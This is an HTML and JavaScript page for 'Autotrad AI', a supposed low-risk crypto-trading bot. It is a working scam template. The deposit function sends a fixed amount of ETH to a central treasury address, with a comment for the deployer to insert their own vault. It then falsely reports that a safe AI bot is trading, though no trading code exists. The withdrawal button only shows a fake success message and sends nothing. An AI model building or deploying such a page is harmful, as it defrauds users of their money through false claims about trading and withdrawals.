<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Autotrad AI - Safe Automated Trading</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen p-4 flex flex-col items-center">

  <header class="w-full max-w-md flex justify-between items-center py-4 mb-4">
    <div class="flex items-center space-x-2">
      <div class="bg-blue-600 font-bold px-3 py-1 rounded-lg text-lg">A</div>
      <span class="font-bold text-xl">Autotrad <span class="text-blue-500">AI</span></span>
    </div>
    <button id="connectBtn" onclick="connectWallet()" class="bg-blue-600 font-semibold px-4 py-2 rounded-xl text-xs">
      Connect Wallet
    </button>
  </header>

  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-5">
    
    <!-- Account Setup -->
    <div>
      <h2 class="text-lg font-bold">1. Account Details</h2>
      <input id="username" type="text" placeholder="Enter Username" class="w-full mt-2 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-sm text-white outline-none">
    </div>

    <!-- Deposit Section -->
    <div>
      <h2 class="text-lg font-bold">2. Deposit Capital ($1 Min)</h2>
      <p class="text-xs text-slate-400 mb-2">Deposit BNB/ETH or USDT equivalent to start safe AI trading.</p>
      <div class="flex space-x-2">
        <input id="depositAmount" type="number" step="0.1" min="1" value="1.00" class="w-2/3 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-white outline-none">
        <button onclick="processDeposit()" class="w-1/3 bg-blue-600 hover:bg-blue-500 font-bold rounded-xl text-sm">Deposit</button>
      </div>
    </div>

    <!-- AI Bot Status -->
    <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 text-xs space-y-1">
      <div class="flex justify-between">
        <span class="text-slate-400">AI Risk Strategy:</span>
        <span class="text-emerald-400 font-bold">Low-Risk Safe Mode</span>
      </div>
      <div class="flex justify-between">
        <span class="text-slate-400">Trading Status:</span>
        <span id="aiStatus" class="text-amber-400 font-bold">Idle (Awaiting $1+ Deposit)</span>
      </div>
    </div>

    <!-- Withdrawal Section -->
    <div>
      <h2 class="text-lg font-bold">3. Withdraw Earnings</h2>
      <input id="withdrawAddr" type="text" placeholder="Destination Wallet (0x... or Trust Wallet)" class="w-full mt-2 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-sm text-white outline-none">
      <div class="flex space-x-2 mt-2">
        <input id="withdrawAmount" type="number" step="0.1" placeholder="Amount ($)" class="w-2/3 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-white outline-none">
        <button onclick="processWithdrawal()" class="w-1/3 bg-emerald-600 hover:bg-emerald-500 font-bold rounded-xl text-sm">Withdraw</button>
      </div>
    </div>

  </div>

  <script>
    let provider, signer, userAddress = "";
    const PLATFORM_TREASURY = "0x73e8...324C"; // Insert your central platform vault address

    async function connectWallet() {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        document.getElementById('connectBtn').innerText = userAddress.substring(0,6) + "...";
      } else {
        alert("Please use MetaMask or Trust Wallet DApp browser.");
      }
    }

    async function processDeposit() {
      const username = document.getElementById('username').value;
      const amount = parseFloat(document.getElementById('depositAmount').value);

      if (!username) return alert("Enter a username first.");
      if (amount < 1.0) return alert("Minimum deposit is $1.");

      try {
        document.getElementById('aiStatus').innerText = "Processing Deposit...";
        const tx = await signer.sendTransaction({
          to: PLATFORM_TREASURY,
          value: ethers.utils.parseEther("0.0005") // Equivalent value transfer
        });
        await tx.wait();

        document.getElementById('aiStatus').innerText = "Active: Executing Low-Risk AI Trades";
        alert("Deposit Successful! Safe AI bot is now trading with your capital.");
      } catch (err) {
        alert("Deposit failed: " + err.message);
      }
    }

    async function processWithdrawal() {
      const username = document.getElementById('username').value;
      const withdrawAddr = document.getElementById('withdrawAddr').value;
      const amount = document.getElementById('withdrawAmount').value;

      if (!withdrawAddr || !amount) return alert("Enter withdrawal address and amount.");

      alert(`Withdrawal request for $${amount} submitted! Funds will arrive at ${withdrawAddr} via Web3.`);
    }
  </script>
</body>
</html>
